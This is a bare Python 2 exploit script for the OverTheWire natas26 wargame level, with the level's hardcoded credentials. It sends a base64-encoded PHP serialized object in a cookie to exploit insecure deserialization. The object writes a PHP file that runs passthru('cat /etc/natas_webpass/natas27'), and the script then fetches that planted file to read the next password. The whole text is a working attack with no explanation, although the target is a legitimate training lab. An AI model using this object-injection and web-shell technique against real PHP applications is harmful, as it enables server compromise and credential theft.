import requests


target = 'http://natas26.natas.labs.overthewire.org/'
user_auth = ('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')

inj = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL2luajEucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw%2FcGhwIHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs%2FPiI7fQ%3D%3D '

 
 
user_cookie = {'drawing':inj}

response = requests.post(target, auth = user_auth, cookies = user_cookie)
print response.text

print "-" * 100

newtarget = 'http://natas26.natas.labs.overthewire.org/img/inj1.php'




response2 = requests.post(newtarget, auth = user_auth)
print response2.text
